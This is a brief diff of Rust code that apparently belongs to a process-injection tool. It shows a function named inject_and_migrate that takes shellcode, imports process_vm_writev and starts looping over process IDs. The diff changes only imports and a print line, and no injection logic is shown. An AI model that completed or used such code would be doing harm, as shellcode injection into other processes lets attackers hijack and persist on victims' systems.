@@ -1,11 +1,11 @@
 extern crate libc;
-use libc::process_vm_readv;
+use libc::{process_vm_readv, process_vm_writev};
 use std::process::{Command};
 
 const MAX_PID: i32 = 32768;
 
 pub fn inject_and_migrate(shellcode: &[u8]) {
-    println!("{}", "this is a thing");
+    println!("Printing a {}", "thing");
     let mut pid = 2;
     // End up changing this to less than MAX_PID
     while pid < 2000 {
